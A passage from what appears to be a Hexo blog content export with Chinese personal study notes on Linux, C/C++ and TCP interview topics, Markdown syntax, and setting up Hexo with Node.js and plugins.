<li>统计出一个目录下，包含某个字符串的文本文件<br> 3.grep -rnw “[str]” [dir]</li>
<li>使用top命令后，一般关注那些参数<br> 4.譬如 wa id si ，让其介绍参数所代表的意义<br>6.7% us — 用户空间占用CPU的百分比。</li>
</ol>
<p>0.4% sy — 内核空间占用CPU的百分比。</p>
<p>0.0% ni — 改变过优先级的进程占用CPU的百分比</p>
<p>92.9% id — 空闲CPU百分比</p>
<p>0.0% wa — IO等待占用CPU的百分比</p>
<p>0.0% hi — 硬中断（Hardware IRQ）占用CPU的百分比</p>
<p>0.0% si — 软中断（Software Interrupts）占用CPU的百分比</p>
<h3 id="1-4-linux启动"><a href="#1-4-linux启动" class="headerlink" title="1.4. linux启动"></a>1.4. linux启动</h3><p>加载BIOS<br>读取MBR（硬盘上第0磁道第一个扇区被称为MBR）<br>Boot Loader（Boot Loader 就是在操作系统内核运行之前运行的一段小程序。通过这段小程序，我们可以初始化硬件设备、建立内存空间的映射图，从而将系统的软硬件环境带到一个合适的状态，以便为最终调用操作系统内核做好一切准备。其中Grub、Lilo和spfdisk是常见的Loader）<br>加载内核（根据grub设定的内核映像所在路径，系统读取内存映像，并进行解压缩操作。）<br>用户层init依据inittab文件来设定运行等级<br>init进程执行rc.sysinit（Linux系统执行的第一个用户层文件就是&#x2F;etc&#x2F;rc.d&#x2F;rc.sysinit脚本程序，它做的工作非常多，包括设定PATH、设定网络配置（&#x2F;etc&#x2F;sysconfig&#x2F;network）、启动swap分区、设定&#x2F;proc等等）<br>启动内核模块（具体是依据&#x2F;etc&#x2F;modules.conf文件或&#x2F;etc&#x2F;modules.d目录下的文件来装载内核模块）<br>执行不同运行级别的脚本程序（根据运行级别的不同，系统会运行rc0.d到rc6.d中的相应的脚本程序，来完成相应的初始化工作和启动相应的服务）<br>执行&#x2F;etc&#x2F;rc.d&#x2F;rc.local（rc.local就是在一切初始化工作后，Linux留给用户进行个性化的地方。）<br>执行&#x2F;bin&#x2F;login程序，进入登录状态</p>
<h3 id="1-5-文件系统"><a href="#1-5-文件系统" class="headerlink" title="1.5. 文件系统"></a>1.5. 文件系统</h3><p>硬连接：指通过索引节点来进行连接。在Linux的文件系统中，保存在磁盘分区中的文件不管是什么类型都给它分配一个编号，称为索引节点号(Inode Index)。<br>在Linux中，多个文件名指向同一索引节点是存在的。一般这种连接就是硬连接。硬连接的作用是允许一个文件拥有多个有效路径名，<br>这样用户就可以建立硬连接到重要文件，以防止“误删”的功能。其原因如上所述，因为对应该目录的索引节点有一个以上的连接。<br>只删除一个连接并不影响索引节点本身和其它的连接，只有当最后一个连接被删除后，文件的数据块及目录的连接才会被释放。<br>也就是说，文件真正删除的条件是与之相关的所有硬连接文件均被删除。</p>
<p>软连接：另外一种连接称之为符号连接（Symbolic Link），也叫软连接。软链接文件有类似于Windows的快捷方式。<br>        它实际上是一个特殊的文件。在符号连接中，文件实际上是一个文本文件，其中包含的有另一文件的位置信息。</p>
<h3 id="1-6-进程线程"><a href="#1-6-进程线程" class="headerlink" title="1.6. 进程线程"></a>1.6. 进程线程</h3><h4 id="1-多线程同步的几种方式？"><a href="#1-多线程同步的几种方式？" class="headerlink" title="1) 多线程同步的几种方式？"></a>1) 多线程同步的几种方式？</h4><p>互斥锁、条件变量、读写锁、信号量</p>
<h4 id="2-什么是孤儿进程？-什么是僵尸进程？如何判断一个进程是否为孤儿进程-僵尸进程？-如何产生，-有什么危害？"><a href="#2-什么是孤儿进程？-什么是僵尸进程？如何判断一个进程是否为孤儿进程-僵尸进程？-如何产生，-有什么危害？" class="headerlink" title="2) 什么是孤儿进程？ 什么是僵尸进程？如何判断一个进程是否为孤儿进程&#x2F;僵尸进程？ 如何产生， 有什么危害？"></a>2) 什么是孤儿进程？ 什么是僵尸进程？如何判断一个进程是否为孤儿进程&#x2F;僵尸进程？ 如何产生， 有什么危害？</h4><ul>
<li>孤儿进程：一个父进程退出，而它的一个或多个子进程还在运行，那么那些子进程将成为孤儿进程。孤儿进程将被init进程(进程号为1)所收养，并由init进程对它们完成状态收集工作。</li>
<li>僵尸进程：一个进程使用fork创建子进程，如果子进程退出，而父进程并没有调用wait或waitpid获取子进程的状态信息，那么子进程的进程描述符仍然保存在系统中。这种进程称之为僵死进程。</li>
</ul>
<h4 id="3-进程间通信方式："><a href="#3-进程间通信方式：" class="headerlink" title="3) 进程间通信方式："></a>3) 进程间通信方式：</h4><ul>
<li>管道：管道是一种半双工的通信方式，数据只能单向流动，而且只能在具有亲缘关系的进程间使用。进程的亲缘关系通常是指父子进程关系。</li>
<li>信号量： 信号量是一个计数器，可以用来控制多个进程对共享资源的访问。它常作为一种锁机制，防止某进程正在访问共享资源时，其他进程也访问该资源。因此，主要作为进程间以及同一进程内不同线程之间的同步手段。</li>
<li>消息队列： 消息队列是由消息的链表，存放在内核中并由消息队列标识符标识。消息队列克服了信号传递信息少、管道只能承载无格式字节流以及缓冲区大小受限等缺点。</li>
<li>共享内存：共享内存就是映射一段能被其他进程所访问的内存，这段共享内存由一个进程创建，但多个进程都可以访问。共享内存是最快的 IPC 方式，它是针对其他进程间通信方式运行效率低而专门设计的。它往往与其他通信机制，如信号两，配合使用，来实现进程间的同步和通信。</li>
<li>套接字： 套解口也是一种进程间通信机制，与其他通信机制不同的是，它可用于不同及其间的进程通信。</li>
</ul>
<h4 id="4-fork、vfork和clone的区别"><a href="#4-fork、vfork和clone的区别" class="headerlink" title="4) fork、vfork和clone的区别"></a>4) fork、vfork和clone的区别</h4><ul>
<li>fork和vfork都是调用clone，但是传的标志位不同</li>
<li>vfork执行后，除非调用<code>exec</code>或<code>vfork_done</code>，否则不会让父进程继续运行，主要是因为当时没有写时拷贝的机制而建立的</li>
<li>fork执行后，父子进程都会返回继续执行，一般先让子进程运行，因为可能调用了exec就不依赖共享的内存页。如果父进程先运行，写了共享的内存页会拷贝一份造成多余的拷贝操作</li>
</ul>
<h3 id="1-7-内存管理"><a href="#1-7-内存管理" class="headerlink" title="1.7. 内存管理"></a>1.7. 内存管理</h3><ol>
<li>malloc最多申请多大内存</li>
<li>Linux 内存分区是怎样的，总共分为几个区？</li>
<li>ps命令中，VSZ和RSS分别代表什么？两者有什么联系和区别？</li>
</ol>
<p>1.考虑 32 位系统 4G 内存：3G 给用户，1G 给内核。用户区：栈区、堆区、全局区（静态区）、常量区、程序代码区（最好能画出来）。<br>2.虚拟内存占用空间和实际物理内存占用空间。VSZ包括进程可访问的所有内存，如包括swap、动态链接库、堆栈中的内存；RSS包括动态链接库，堆栈内存，但不包括swap中的内存。</p>
<h2 id="2-C-C"><a href="#2-C-C" class="headerlink" title="2. C&#x2F;C++"></a>2. C&#x2F;C++</h2><h3 id="2-1-内存管理"><a href="#2-1-内存管理" class="headerlink" title="2.1. 内存管理"></a>2.1. 内存管理</h3><p>在C++中内存分成5个区，分别是堆、栈、全局&#x2F;静态存储区、常量存储区和代码区；<br>a、栈，就是那些由编译器在需要的时候分配，在不需要的时候自动清楚的变量的存储区，里面的变量通常是局部变量、函数参数等。<br>b、堆，就是那些由new分配的内存块，他们的释放编译器不去管，由我们的应用程序去控制，一般一个new就要对应一个delete。如<br>果程序员没有释放掉，那么在程序结束后，操作系统会自动回收。<br>c、全局&#x2F;静态存储区，全局变量和静态变量被分配到同一块内存中，在以前的C语言中，全局变量又分为初始化的和未初始化的，在<br>C++里面没有这个区分了，他们共同占用同一块内存区。<br>d、常量存储区，这是一块比较特殊的存储区，他们里面存放的是常量，不允许修改（当然，你要通过非正当手段也可以修改）。<br>e、代码区 （.text段），存放代码（如函数），不允许修改（类似常量存储区），但可以执行（不同于常量存储区）。</p>
<h3 id="2-2-编译原理"><a href="#2-2-编译原理" class="headerlink" title="2.2. 编译原理"></a>2.2. 编译原理</h3><ol>
<li>符号表</li>
<li>符号隐藏</li>
<li>动态库符号引入</li>
</ol>
<h4 id="1-下面语句是否有错，解释一下"><a href="#1-下面语句是否有错，解释一下" class="headerlink" title="1) 下面语句是否有错，解释一下"></a>1) 下面语句是否有错，解释一下</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> a;</span><br><span class="line"><span class="comment">// 有错，没有对常量进行初始化</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> b;</span><br><span class="line"><span class="comment">// 没问题，虽然尽量要求初始化</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> &amp;c;</span><br><span class="line"><span class="comment">// 有错，没有对左值定义进行初始化</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> *d; d = <span class="keyword">new</span> <span class="type">int</span>[<span class="number">10</span>]; <span class="keyword">delete</span> d;</span><br><span class="line"><span class="comment">// 有错，需要delete[] d;，但是现在编译器可能帮你优化了，不造成内存泄漏，还是不建议这样写</span></span><br><span class="line"></span><br><span class="line">(a+b)++</span><br><span class="line"><span class="comment">// 有错，自增操作符需要是左值，给的是右值</span></span><br></pre></td></tr></table></figure>

<h4 id="2-链接过程的重定位"><a href="#2-链接过程的重定位" class="headerlink" title="2) 链接过程的重定位"></a>2) 链接过程的重定位</h4><p><a href="/blogs/2018-09-18-CStudy/#1-%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B%E7%9A%84%E9%87%8D%E5%AE%9A%E4%BD%8D">c语言-链接过程的重定位</a></p>
<h3 id="2-3-调试"><a href="#2-3-调试" class="headerlink" title="2.3. 调试"></a>2.3. 调试</h3><ol>
<li>跟踪程序系统调用</li>
<li>堆栈信息打印</li>
<li>gdb，打印堆栈命令<ul>
<li>bt</li>
</ul>
</li>
</ol>
<h3 id="2-4-指针"><a href="#2-4-指针" class="headerlink" title="2.4. 指针"></a>2.4. 指针</h3><h4 id="1-说明下面语句的区别"><a href="#1-说明下面语句的区别" class="headerlink" title="1) 说明下面语句的区别"></a>1) 说明下面语句的区别</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *p = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"><span class="comment">// 使用char *指向常量空间，编译会报warning。*p和p[n]修改值可以编译通过，但是实际不可修改，修改会崩溃。p本身的指向可以修改为其他内存</span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *p = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"><span class="comment">// 使用const char *指向常量空间，编译没问题。*p和p[n]不允许修改，编译会报错。p本身可以修改为指向其他内存</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> * <span class="type">const</span> p = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"><span class="comment">// 使用char *指向常量空间，编译会报warning。*p和p[n]修改值可以编译通过，但是实际不可修改，修改会崩溃。p本身也不能指向其他位置</span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> * <span class="type">const</span> p = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"><span class="comment">// 使用const char *指向常量空间，编译没问题。*p和p[n]不允许修改，编译会报错。p本身也不能指向其他位置</span></span><br></pre></td></tr></table></figure>

<h4 id="2-给出下面的结果并说明原因"><a href="#2-给出下面的结果并说明原因" class="headerlink" title="2) 给出下面的结果并说明原因"></a>2) 给出下面的结果并说明原因</h4><h5 id="1"><a href="#1" class="headerlink" title="(1)"></a>(1)</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> arr[<span class="number">5</span>] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, *(*(&amp;arr+<span class="number">1</span>)<span class="number">-1</span>));</span><br></pre></td></tr></table></figure>

<ul>
<li>结果是5</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">&amp;arr;           <span class="comment">// int (*)[5]</span></span><br><span class="line">&amp;arr+<span class="number">1</span>;         <span class="comment">// 地址偏移5个int</span></span><br><span class="line">*(&amp;arr+<span class="number">1</span>);      <span class="comment">// 指向arr后5个int的地方</span></span><br><span class="line">*(&amp;arr+<span class="number">1</span>)<span class="number">-1</span>;    <span class="comment">// 指向arr最后一个元素的地址</span></span><br><span class="line">*(*(&amp;arr+<span class="number">1</span>)<span class="number">-1</span>); <span class="comment">// 5</span></span><br></pre></td></tr></table></figure>

<h3 id="2-5-设计思想"><a href="#2-5-设计思想" class="headerlink" title="2.5. 设计思想"></a>2.5. 设计思想</h3><h4 id="1-RAII机制"><a href="#1-RAII机制" class="headerlink" title="1) RAII机制"></a>1) RAII机制</h4><ul>
<li>resource acquisition is initialization 资源获取即初始化</li>
<li>核心是将资源和对象生命周期绑定，对象创建就获取资源，对象销毁就释放资源</li>
<li>RAII机制是指利用对象的销毁机制来实现内存资源的生命周期管理</li>
<li>比如智能指针，利用智能指针的析构的时候，调用delete将指向的内存释放，编程者不用关心释放时机</li>
<li>lock_guard，利用栈变量在作用域离开后自动销毁的机制实现自动解锁</li>
</ul>
<h2 id="3-网络"><a href="#3-网络" class="headerlink" title="3. 网络"></a>3. 网络</h2><h3 id="2-1-TCP-IP"><a href="#2-1-TCP-IP" class="headerlink" title="2.1. TCP&#x2F;IP"></a>2.1. TCP&#x2F;IP</h3><h4 id="1-udp可以调用connect嘛-和tcp调用connect有什么不同？"><a href="#1-udp可以调用connect嘛-和tcp调用connect有什么不同？" class="headerlink" title="1) udp可以调用connect嘛?和tcp调用connect有什么不同？"></a>1) udp可以调用connect嘛?和tcp调用connect有什么不同？</h4><p>可以， 没有实际的握手，只是指定了目的ip和端口，可以使用send recv收发包</p>
<h4 id="2-udp可用调用bind嘛？"><a href="#2-udp可用调用bind嘛？" class="headerlink" title="2) udp可用调用bind嘛？"></a>2) udp可用调用bind嘛？</h4><p>可以，绑定源ip和源端口</p>
<h4 id="3-listen第二个参数的作用-全连接队列、半连接队列-，半连接队满会有什么影响？全连接队列满会有什么影响？"><a href="#3-listen第二个参数的作用-全连接队列、半连接队列-，半连接队满会有什么影响？全连接队列满会有什么影响？" class="headerlink" title="3) listen第二个参数的作用(全连接队列、半连接队列)，半连接队满会有什么影响？全连接队列满会有什么影响？"></a>3) listen第二个参数的作用(全连接队列、半连接队列)，半连接队满会有什么影响？全连接队列满会有什么影响？</h4><p>设置全连接队列长度，但是内核参数somaxconn必须也要放开才可以</p>
<p>对于SYN半连接队列的大小是由（&#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;tcp_max_syn_backlog）这个内核参数控制的，有些内核似乎也受listen的backlog参数影响，取得是两个值的最小值。<br>当这个队列满了，不开启syncookies的时候，Server会丢弃新来的SYN包，而Client端在多次重发SYN包得不到响应而返回（connection time out）错误。<br>但是，当Server端开启了syncookies&#x3D;1，那么SYN半连接队列就没有逻辑上的最大值了，并且&#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;tcp_max_syn_backlog设置的值也会被忽略</p>
<p>当accept队列满了之后，即使client继续向server发送ACK的包，也会不被响应，此时ListenOverflows+1，同时server通过&#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;tcp_abort_on_overflow来决定如何返回，0表示直接丢弃该ACK，1表示发送RST通知client；<br>相应的，client则会分别返回read timeout 或者 connection reset by peer。</p>
<h4 id="4-TIME-WAIT状态是主动关闭的一方进入还是被动关闭的一方进入？为什么有这个状态，要解决什么问题？如何减少服务端的TIME-WAIT？"><a href="#4-TIME-WAIT状态是主动关闭的一方进入还是被动关闭的一方进入？为什么有这个状态，要解决什么问题？如何减少服务端的TIME-WAIT？" class="headerlink" title="4) TIME_WAIT状态是主动关闭的一方进入还是被动关闭的一方进入？为什么有这个状态，要解决什么问题？如何减少服务端的TIME_WAIT？"></a>4) TIME_WAIT状态是主动关闭的一方进入还是被动关闭的一方进入？为什么有这个状态，要解决什么问题？如何减少服务端的TIME_WAIT？</h4><ul>
<li>主动关闭方会发送fin收到ack后，等对端发送的fin回复ack后进入TIME_WAIT状态。</li>
<li>为了防止自己回复的ack对方没有收到，如果对方没有收到会重发fin，这时等待的socket可以处理此fin重传ack而让对方可靠关闭。2msl就是对方重传fin包的时间，对方发送的fin包到自己经过1个msl，发送ack如果对方没有收到会等2个msl（Maximum Segment Lifetime）再发送，自己收到第二个fin包和第一个fin包之间间隔2个msl，所以要等待这么久。</li>
<li>调整内核参数<ul>
<li><code>net.ipv4.tcp_tw_reuse</code>: time_wait状态的端口是否可重用</li>
<li><code>net.ipv4.tcp_timestamp</code>: 和上面配置一起，当配置了上面的配置，在新建立连接时如果time_wait间隔超过此时间（单位s）就可以复用</li>
<li><code>net.ipv4.tcp_max_tw_buckets</code>: 当time_wait超过此值，会重置前面的连接</li>
</ul>
</li>
</ul>
<h4 id="5-描述一下浏览器访问一个URL的全过程。"><a href="#5-描述一下浏览器访问一个URL的全过程。" class="headerlink" title="5) 描述一下浏览器访问一个URL的全过程。"></a>5) 描述一下浏览器访问一个URL的全过程。</h4><p>从ARP查找，DNS查找，三次握手，请求，回复等。</p>
<h4 id="6-谈下网络拥塞和TCP的拥塞控制机制（什么是：慢启动、拥塞避免、快速重传-、快速恢复）"><a href="#6-谈下网络拥塞和TCP的拥塞控制机制（什么是：慢启动、拥塞避免、快速重传-、快速恢复）" class="headerlink" title="6) 谈下网络拥塞和TCP的拥塞控制机制（什么是：慢启动、拥塞避免、快速重传 、快速恢复）"></a>6) 谈下网络拥塞和TCP的拥塞控制机制（什么是：慢启动、拥塞避免、快速重传 、快速恢复）</h4><p>网络拥塞现象是指到达通信子网中某一部分的分组数量过多，使得该部分网络来不及处理，以致引起这部分乃至整个网络性能下降的现象，<br>严重时导致网络通信业务陷入停顿出现死锁现象。拥塞控制是通过拥塞窗口处理网络拥塞现象的一种机制。<br>TCP的拥塞控制由4个核心算法组成：慢启动、拥塞避免、快速重传 、快速恢复。</p>
<p><strong>慢启动+拥塞避免：</strong></p>
<p>发送方会维护一个拥塞窗口cwind的变量并且设置一个初始的ssthresh（慢启动阀值），这个变量会随着网络的拥塞状况发生改变。<br>刚开始发送数据的时候，发送方会将cwind的值置为1（一般为一个MSS）。后面每次收到ack包后就将cwind的值翻倍直到ssthresh。<br>到达ssthresh后，进入拥塞控制阶段，这个时候，cwind不再指数级增长，而是每次收到一个ack包，cwind增加1（加法增大）。<br>直到发生超时的时候，将ssthresh的值置为当前cwind值的一半，然后将cwind值回退为1，重新开始慢启动。如此反复。<br>慢启动依赖“超时”来调整ssthresh的值，而在等待超时的时间中，tcp连接会一直处于空闲阶段。<br>而一旦超时，cwind将从1开始增加，这样无疑会影响tcp的传输效率，所以，快速重传和快速回复为了弥补这个缺点而产生。</p>
<p><strong>快速重传：</strong></p>
<p>接受方在接收到失序报文的时候，应该立即发出重复确认，当发送方接受到三个重复确认的时候就会知道丢包了，而不是等到超时。<br>eg：recv方接受到M1, M2, M4, M5, M6的时候，因为M3丢失，接受方在接收到4-6的时候会对连发三个对M2的重复确认，<br>这样，发送方就知道丢包了，然后调整ssthresh的值为当前cwnd值的一半。与之前不同的是，快速重传会结合快速恢复。<br>发生超时后，不再将cwnd的值重新置为1，而是从赋值为新的ssthresh的值，然后加法增</p>
<h1 id="三、利益相关"><a href="#三、利益相关" class="headerlink" title="三、利益相关"></a>三、利益相关</h1><ol>
<li>时间冲突怎么做</li>
</ol>
]]></content>
      <categories>
        <category>Work</category>
      </categories>
  </entry>
  <entry>
    <title>markdown学习笔记</title>
    <url>/blogs/2018-10-08-markdownStudy/</url>
    <content><![CDATA[<h1 id="一、写文档"><a href="#一、写文档" class="headerlink" title="一、写文档"></a>一、写文档</h1><h2 id="1-空格"><a href="#1-空格" class="headerlink" title="1. 空格"></a>1. 空格</h2><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&amp;nbsp;</span><br></pre></td></tr></table></figure>

<h2 id="2-删除线"><a href="#2-删除线" class="headerlink" title="2. 删除线"></a>2. 删除线</h2><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">~~删除线~~</span><br></pre></td></tr></table></figure>

<p>效果</p>
<p><del>删除线</del></p>
<h2 id="3-超链接"><a href="#3-超链接" class="headerlink" title="3. 超链接"></a>3. 超链接</h2><h3 id="链接写在文中"><a href="#链接写在文中" class="headerlink" title="链接写在文中"></a>链接写在文中</h3><p>代码</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">[<span class="string">我的博客</span>](<span class="link">https://githubwyb.github.io/</span>)</span><br></pre></td></tr></table></figure>

<p>效果</p>
<p><a href="https://githubwyb.github.io/">我的博客</a></p>
<h3 id="链接写在文后"><a href="#链接写在文后" class="headerlink" title="链接写在文后"></a>链接写在文后</h3><p>代码</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">[<span class="string">我的博客</span>][<span class="symbol">1</span>]</span><br><span class="line"></span><br><span class="line">[<span class="symbol">1</span>]: <span class="link">https://githubwyb.github.io/</span></span><br></pre></td></tr></table></figure>

<p>效果</p>
<p><a href="https://githubwyb.github.io/">我的博客</a></p>
<h2 id="4-文内跳转"><a href="#4-文内跳转" class="headerlink" title="4. 文内跳转"></a>4. 文内跳转</h2><p>代码</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span> = <span class="string">&quot;test&quot;</span>&gt;</span></span>跳转到这里<span class="language-xml"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">[<span class="string">跳转</span>](<span class="link">#test</span>)</span><br></pre></td></tr></table></figure>

<p>效果</p>
<p><span id = "test">跳转到这里</span></p>
<p><a href="#test">跳转</a></p>
<h2 id="5-代码块中有反引号"><a href="#5-代码块中有反引号" class="headerlink" title="5. 代码块中有反引号"></a>5. 代码块中有反引号</h2><ul>
<li>比要加的多就好了</li>
</ul>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="bullet">-</span> 行内 <span class="code">``a`</span>b``</span><br><span class="line"><span class="bullet">-</span> 代码块</span><br><span class="line"></span><br><span class="line"><span class="code">````markdown</span></span><br><span class="line"><span class="code">```shell</span></span><br><span class="line"><span class="code">echo</span></span><br><span class="line"><span class="code">```</span></span><br><span class="line"><span class="code">````</span></span><br></pre></td></tr></table></figure>

<p><strong>效果</strong></p>
<ul>
<li>行内 <code>a`b</code></li>
<li>代码块</li>
</ul>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="code">```shell</span></span><br><span class="line"><span class="code">echo</span></span><br><span class="line"><span class="code">```</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Program</category>
        <category>Document</category>
      </categories>
  </entry>
  <entry>
    <title>hexo搭建中的学习笔记</title>
    <url>/blogs/2018-09-28-hexoStudy/</url>
    <content><![CDATA[<h1 id="一、安装"><a href="#一、安装" class="headerlink" title="一、安装"></a>一、安装</h1><h2 id="1-ubuntu"><a href="#1-ubuntu" class="headerlink" title="1. ubuntu"></a>1. ubuntu</h2><h3 id="1-1-安装nodejs和npm"><a href="#1-1-安装nodejs和npm" class="headerlink" title="1.1. 安装nodejs和npm"></a>1.1. 安装nodejs和npm</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -sL https://deb.nodesource.com/setup_8.x -o nodesource_setup.sh</span><br><span class="line">sudo bash nodesource_setup.sh</span><br><span class="line">sudo apt-get install nodejs</span><br></pre></td></tr></table></figure>

<h3 id="1-2-安装hexo和hexo-cli"><a href="#1-2-安装hexo和hexo-cli" class="headerlink" title="1.2. 安装hexo和hexo-cli"></a>1.2. 安装hexo和hexo-cli</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo npm install hexo -g</span><br><span class="line">sudo npm install hexo-cli -g</span><br></pre></td></tr></table></figure>

<h3 id="1-3-迁移博客代码到另一台电脑"><a href="#1-3-迁移博客代码到另一台电脑" class="headerlink" title="1.3. 迁移博客代码到另一台电脑"></a>1.3. 迁移博客代码到另一台电脑</h3><ul>
<li>先安装<code>hexo</code>和<code>hexo-cli</code>的环境</li>
<li>然后执行</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装所有组件忽略脚本</span></span><br><span class="line">sudo npm install --ignore-scripts</span><br><span class="line">sudo npm audit fix</span><br></pre></td></tr></table></figure>

<h1 id="二、配置"><a href="#二、配置" class="headerlink" title="二、配置"></a>二、配置</h1><h2 id="1-自定义css样式"><a href="#1-自定义css样式" class="headerlink" title="1. 自定义css样式"></a>1. 自定义css样式</h2><ul>
<li>修改主题的配置文件<code>themes/next/source/css/main.styl</code></li>
<li>在下面语句后面加css样式即可，如下面把代码块的tab宽度改成4个空格</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">// Custom Layer</span><br><span class="line">// --------------------------------------------------</span><br><span class="line">pre &#123;tab-size: 4;&#125;</span><br></pre></td></tr></table></figure>

<h1 id="三、插件和操作"><a href="#三、插件和操作" class="headerlink" title="三、插件和操作"></a>三、插件和操作</h1><h2 id="1-博客置顶"><a href="#1-博客置顶" class="headerlink" title="1. 博客置顶"></a>1. 博客置顶</h2><h3 id="单纯置顶"><a href="#单纯置顶" class="headerlink" title="单纯置顶"></a>单纯置顶</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm uninstall hexo-generator-index --save</span><br><span class="line">npm install hexo-generator-index-pin-top --save</span><br></pre></td></tr></table></figure>

<ul>
<li>然后在需要置顶的文章的Front-matter中加上top属性即可，根据top属性的大小排序，越大越靠前。比如下面这篇文章：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: hexo+GitHub博客搭建实战</span><br><span class="line">date: 2017-09-08 12:00:25</span><br><span class="line">categories: 博客搭建系列</span><br><span class="line">top: 5</span><br><span class="line">---</span><br></pre></td></tr></table></figure>

<h2 id="2-pdf插件"><a href="#2-pdf插件" class="headerlink" title="2. pdf插件"></a>2. pdf插件</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><ul>
<li>在博客bash中执行下列命令安装</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install --save hexo-pdf</span><br></pre></td></tr></table></figure>

<h3 id="展示"><a href="#展示" class="headerlink" title="展示"></a>展示</h3><ul>
<li>使用外部文章网页链接</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;% pdf http:<span class="comment">//7xov2f.com1.z0.glb.clouddn.com/bash_freshman.pdf %&#125;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>本地</li>
</ul>
<p>需要创建一个同名的文件夹，放我们要上传的PDF文章</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;% pdf  test.pdf %&#125;</span><br></pre></td></tr></table></figure>

<h2 id="3-字数统计和阅读时长-网站底部-文章内"><a href="#3-字数统计和阅读时长-网站底部-文章内" class="headerlink" title="3. 字数统计和阅读时长(网站底部&#x2F;文章内)"></a>3. 字数统计和阅读时长(网站底部&#x2F;文章内)</h2><h3 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install hexo-symbols-count-time --save</span><br></pre></td></tr></table></figure>

<h3 id="修改-站点配置文件"><a href="#修改-站点配置文件" class="headerlink" title="修改 站点配置文件"></a>修改 站点配置文件</h3><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">symbols_count_time:</span></span><br><span class="line">    <span class="comment">#文章内是否显示</span></span><br><span class="line">    <span class="attr">symbols:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">time:</span> <span class="literal">true</span></span><br><span class="line">    <span class="comment"># 网页底部是否显示</span></span><br><span class="line">    <span class="attr">total_symbols:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">total_time:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<h3 id="修改-主题配置文件"><a href="#修改-主题配置文件" class="headerlink" title="修改 主题配置文件"></a>修改 主题配置文件</h3><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Post wordcount display settings</span></span><br><span class="line"><span class="comment"># Dependencies: https://github.com/theme-next/hexo-symbols-count-time</span></span><br><span class="line"><span class="attr">symbols_count_time:</span></span><br><span class="line">    <span class="attr">separated_meta:</span> <span class="literal">true</span></span><br><span class="line">    <span class="comment">#文章中的显示是否显示文字（本文字数|阅读时长）</span></span><br><span class="line">    <span class="attr">item_text_post:</span> <span class="literal">true</span></span><br><span class="line">    <span class="comment">#网页底部的显示是否显示文字（站点总字数|站点阅读时长）</span></span><br><span class="line">    <span class="attr">item_text_total:</span> <span class="literal">false</span></span><br><span class="line">    <span class="comment"># Average Word Length (chars count in word)</span></span><br><span class="line">    <span class="attr">awl:</span> <span class="number">4</span></span><br><span class="line">    <span class="comment"># Words Per Minute</span></span><br><span class="line">    <span class="attr">wpm:</span> <span class="number">275</span></span><br></pre></td></tr></table></figure>

<h2 id="4-latex公式支持"><a href="#4-latex公式支持" class="headerlink" title="4. latex公式支持"></a>4. latex公式支持</h2><h3 id="Next主题中自带latex插件"><a href="#Next主题中自带latex插件" class="headerlink" title="Next主题中自带latex插件"></a>Next主题中自带latex插件</h3><p>修改<code>_config.xml</code>文件即可</p>
